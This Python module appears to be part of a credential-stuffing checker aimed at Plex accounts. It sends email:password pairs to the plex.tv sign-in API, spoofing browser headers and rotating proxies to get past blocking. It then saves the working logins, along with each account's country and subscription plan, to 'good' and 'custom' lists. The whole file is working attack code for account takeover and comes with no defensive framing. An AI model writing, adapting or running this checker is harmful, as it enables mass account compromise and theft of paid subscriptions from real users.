from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy, get_guid
from requests import post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        guid = get_guid()
        headers = {
            "Content-Type": "application/x-www-form-urlencoded" ,
            "accept": "application/json" ,
            "accept-language": "en-US,en;q=0.9" ,
            "origin": "https://app.plex.tv" ,
            "referer": "https://app.plex.tv/", 
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36" 
        }
        data = f"login={email}&password={password}&rememberMe=true"
        try:
            response = post(f"https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20Web&X-Plex-Version=4.71.0&X-Plex-Client-Identifier={guid}",data=data,headers=headers,proxies=proxy_set,timeout=Checker.timeout)
            if "{\"errors\":" in response.text or "\"status\":401}]}" in response.text or "\"User could not be authenticated\"," in response.text:
                retries += 1
            elif "{\"id\":" in response.text or ",\"uuid\":\"" in response.text or ",\"thumb\":\"" in response.text or "\":{\"active\":" in response.text:
                data = response.json()
                country = data["country"]
                active = data["subscription"]["active"]
                subscription = data["subscriptionDescription"]
                if active:
                    Checker.good += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("good",email+":"+password,"Plextv")
                    save("Plextv","good",Checker.time,email+":"+password+f" | Country: {country} | Plan: {subscription}")
                    return
                else:
                    Checker.custom += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("custom",email+":"+password,"Plextv")
                    save("Plextv","custom",Checker.time,email+":"+password)
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return